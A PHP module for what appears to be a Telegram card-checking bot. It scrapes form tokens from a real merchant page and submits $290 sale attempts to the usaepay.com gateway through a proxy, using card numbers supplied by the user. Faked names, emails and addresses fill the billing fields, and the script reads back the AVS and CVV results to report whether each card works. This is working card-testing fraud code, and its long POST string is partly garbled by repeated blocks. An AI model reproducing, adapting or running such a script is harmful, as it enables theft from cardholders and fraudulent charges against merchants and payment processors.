<?php
ini_set('display_errors', 1);

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# ~ REQ 1 ~ #
$headers1 = ['user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4140.111 Safari/537.36', 'Host: freedommerchants.com', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3', 'DNT: 1', 'Connection: keep-alive', 'Upgrade-Insecure-Requests: 1'];
$site1 = ['url' => 'https://freedommerchants.com/nle/perfsingle.html','method' => 'GET', 'post' => null, 'headers' => $headers1, 'cookie' => null, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);

$umkey = CurlX::ParseString($req1->body, 'type="hidden" name="UMkey" value="', '"');
$uminvoice = CurlX::ParseString($req1->body, 'type="hidden" name="UMinvoice" value="', '"');

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

# ~ REQ 2 ~ #
$num    = [];
$num[0] = substr($cc[0],0,4);
$num[1] = substr($cc[0],4,4);
$num[2] = substr($cc[0],8,4);
$num[3] = substr($cc[0],12,4);
$num[4] = substr($cc[0],14,2);
$cc01 = substr(implode(' ', $num), 0, -3);

$type = array(3 => 'amex', 4 => 'visa', 5 => 'mastercard', 6 => 'discover');

$tnum = substr($cc[0],0,1);
$headers2 = ['User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/527.26 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/527.26', 'Host: www.usaepay.com', 'Referer: https://freedommerchants.com/', 'Origin: https://freedommerchants.com', 'Accept
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3', 'Content-Type
application/x-www-form-urlencoded'];
$post2 = 'UMsubmit=1&UMkey='.$umkey.'&UMredirDeclined=https%3A%2F%2Ffreedommerchants.com%2Fdeclined.html%3Fstatus%3Ddeclined%26title%3DNo+Limits+Endurance&UMredirApproved=https%3A%2F%2Ffreedommerchants.com%2Fnolimitsenduranceapproved.html%3Fname%3D'.Name::firstName().'+'.Name::lastName().'%26description%3DPerformance+Training+Plan+-+Single+Sport%26email%3D'.Internet::freeEmail().'%26invoicenum%3D'.$uminvoice.'%26amount%3D290.00%26maxTransactionSize%3D2000%26compa'.Address::state().'Name%3DNo+Limits+Endurance%26pageName%3Dperfsingle.html%26cardType%3D'.$type[$tnum].'%26phone%3D%28502%29+342-3423%26street%3D'.Address::streetName().'%26state%3D'.Address::state().'%26zip%3D'.Address::zip().'%26city%3D'.Address::state().'%26paymentMethod%3DCredit+Card%26name%3D'.Name::firstName().'+'.Name::lastName().'%26description%3DPerformance+Training+Plan+-+Single+Sport%26email%3D'.Internet::freeEmail().'%26invoicenum%3D'.$uminvoice.'%26amount%3D290.00%26maxTransactionSize%3D2000%26compa'.Address::state().'Name%3DNo+Limits+Endurance%26pageName%3Dperfsingle.html%26cardType%3D'.$type[$tnum].'%26phone%3D%28502%29+342-3423%26street%3D'.Address::streetName().'%26state%3D'.Address::state().'%26zip%3D'.Address::zip().'%26city%3D'.Address::state().'%26paymentMethod%3DCredit+Card%26name%3D'.Name::firstName().'+'.Name::lastName().'%26description%3DPerformance+Training+Plan+-+Single+Sport%26email%3D'.Internet::freeEmail().'%26invoicenum%3D'.$uminvoice.'%26amount%3D290.00%26maxTransactionSize%3D2000%26compa'.Address::state().'Name%3DNo+Limits+Endurance%26pageName%3Dperfsingle.html%26cardType%3D'.$type[$tnum].'%26phone%3D%28502%29+342-3423%26street%3D'.Address::streetName().'%26state%3D'.Address::state().'%26zip%3D'.Address::zip().'%26city%3D'.Address::state().'%26paymentMethod%3DCredit+Card%26name%3D'.Name::firstName().'+'.Name::lastName().'%26description%3DPerformance+Training+Plan+-+Single+Sport%26email%3D'.Internet::freeEmail().'%26invoicenum%3D'.$uminvoice.'%26amount%3D290.00%26maxTransactionSize%3D2000%26compa'.Address::state().'Name%3DNo+Limits+Endurance%26pageName%3Dperfsingle.html%26cardType%3D'.$type[$tnum].'%26phone%3D%28502%29+342-3423%26street%3D'.Address::streetName().'%26state%3D'.Address::state().'%26zip%3D'.Address::zip().'%26city%3D'.Address::state().'%26paymentMethod%3DCredit+Card%26name%3D'.Name::firstName().'+'.Name::lastName().'%26description%3DPerformance+Training+Plan+-+Single+Sport%26email%3D'.Internet::freeEmail().'%26invoicenum%3D'.$uminvoice.'%26amount%3D290.00%26maxTransactionSize%3D2000%26compa'.Address::state().'Name%3DNo+Limits+Endurance%26pageName%3Dperfsingle.html%26cardType%3D'.$type[$tnum].'%26phone%3D%28502%29+342-3423%26street%3D'.Address::streetName().'%26state%3D'.Address::state().'%26zip%3D'.Address::zip().'%26city%3D'.Address::state().'%26paymentMethod%3DCredit+Card%26name%3D'.Name::firstName().'+'.Name::lastName().'%26description%3DPerformance+Training+Plan+-+Single+Sport%26email%3D'.Internet::freeEmail().'%26invoicenum%3D'.$uminvoice.'%26amount%3D290.00%26maxTransactionSize%3D2000%26compa'.Address::state().'Name%3DNo+Limits+Endurance%26pageName%3Dperfsingle.html%26cardType%3D'.$type[$tnum].'%26phone%3D%28502%29+342-3423%26street%3D'.Address::streetName().'%26state%3D'.Address::state().'%26zip%3D'.Address::zip().'%26city%3D'.Address::state().'%26paymentMethod%3DCredit+Card%26status%3Dapproved%26title%3DNo+Limits+Endurance&UMhash=%5BUMhash%5D&UMcommand=cc%3Asale&UMamount=290.00&UMtax=%5BUMtax%5D&UMinvoice='.$uminvoice.'&UMcustid=&UMrecurring=%5BUMrecurring%5D&UMcustreceipt=yes&UMaddcustomer=no&UMstart=next&UMbillamount=0&UMschedule=&UMnumleft=0&UMdescription=Performance+Training+Plan+-+Single+Sport&UMechofields=%5BUMechofields%5D&UMformString=%5BUMformString%5D&maxTransactionSize=2000&pageName=perfsingle.html&compa'.Address::state().'Name=No+Limits+Endurance&cardType='.$type[$tnum].'&cardType='.$type[$tnum].'&UMbillfname='.Name::firstName().'&UMbilllname='.Name::lastName().'&UMname='.Name::firstName().'+'.Name::lastName().'&UMbillphone=%28502%29+342-3423&UMemail='.Internet::freeEmail().'&UMbillstreet='.Address::streetName().'&UMbillcity='.Address::state().'&UMbillstate='.Address::state().'&UMbillzip='.Address::zip().'&UMcustom3=&UMcustom2=&UMcard='.str_replace(" ", "-", $cc01).'&UMexpir='.$cc[1].'/'.$cc[2].'&UMcvv2='.$cc[3].'+&UMrouting=&UMaccount=&submitbutton=Please+Wait...Processing';

$site2 = ['url' => 'https://www.usaepay.com/gate.php','method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => $proxy2];

$req2 = Make::Create(2, $site2, $gate, $user);
$urla = (isset($req2->headers->response['Location'])) ? $req2->headers->response['Location'] : die("URL MISSING \n" . $req2->body);
$urla = urldecode(parse_url($urla, PHP_URL_QUERY)). ';';
IsUnspam($req2, $user);

$avs         = CurlX::ParseString($urla, 'UMavsResult=', '&UM');
$avs_code    = CurlX::ParseString($urla, 'UMavsResultCode=', '&');
$cvv_result  = CurlX::ParseString($urla, 'UMcvv2Result=', '&');
$mensaje_res = CurlX::ParseString($urla, 'UMerror=', '&');
Res::SetParams($avs, null, $avs_code, $cvv_result, $urla);
$res = Res::avs();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));